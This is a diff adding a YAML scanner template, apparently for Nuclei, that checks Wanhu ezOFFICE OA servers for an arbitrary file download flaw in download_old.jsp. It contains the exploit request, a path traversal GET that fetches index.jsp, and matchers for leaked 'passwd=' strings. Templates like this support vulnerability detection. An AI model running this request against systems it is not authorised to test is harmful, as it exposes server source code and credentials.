@@ -1,0 +1,26 @@
+id: poc-yaml-wan-hu-ezoffice-download-old-jsp-anyfile-download
+info:
+  name: 万户 ezOFFICE download_old.jsp 任意文件下载漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read,ssrf
+  description: |
+    万户OA ezOFFICE download_old.jsp contains an arbitrary file download vulnerability.
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/defaultroot/download_old.jsp?path=..&name=x&FileName=index.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "application/x-msdownload"
+      - type: word
+        part: body
+        words:
+          - "passwd="
+          - "getAttribute"
